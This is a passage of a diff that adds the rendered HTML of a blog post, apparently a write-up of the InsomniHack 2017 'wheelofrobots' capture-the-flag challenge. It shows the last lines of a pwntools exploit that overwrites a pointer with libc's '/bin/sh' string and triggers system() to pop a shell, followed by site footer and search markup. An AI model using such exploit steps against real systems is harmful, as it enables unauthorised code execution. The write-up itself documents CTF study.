+</span></span><span class="line"><span class="cl">	<span class="n">change_name</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">remove_bot</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>				<span class="c1"># call system with binsh (system(&#39;/bin/sh\0&#39;))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] Shell popped&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">break</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div>
+          
+          
+          
+        </div>
+
+        
+
+        
+
+        
+
+        
+
+      </div>
+
+      
+      
+        
+        
+          
+          
+        
+        
+        
+        <script
+          type="text/javascript"
+          src="/js/page.min.407e5b2727c1f241c95d53db24c776bea71bfc18e09511b815d669ad8caca6e9e18a53864ad364b1ccccfa2f2956768d33cfe193bfb64d3406f3b5ece354ba57.js"
+          integrity="sha512-QH5bJyfB8kHJXVPbJMd2vqcb/BjglRG4FdZprYyspunhilOGStNksczM&#43;i8pVnaNM8/hk7&#43;2TTQG87Xs41S6Vw=="
+          data-oid="views_posts/1750980453929-InsomniHack-2017-wheelofrobots-Writeup/index.md"
+          data-oid-likes="likes_posts/1750980453929-InsomniHack-2017-wheelofrobots-Writeup/index.md"></script>
+      
+
+    </section>
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/posts/1750900346215-test-article/">
+              <span class="flex flex-col">
+                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >LACTF 2025 minecraft Writeup</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2025-02-09T00:00:00&#43;00:00">9 February 2025</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a
+    href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+      <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+        <ul class="flex flex-col list-none sm:flex-row">
+          
+            <li
+              class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+              <a
+                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
+                href=""
+                title="">
+                
+                
+              </a>
+            </li>
+          
+        </ul>
+      </nav>
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2025
+          Richard Guizar
+      </p>
+    
+
+    
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script> 
+  
+  <script
+    type="text/javascript"
+    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
+    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-index-500"
+  data-url="http://localhost:1313/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
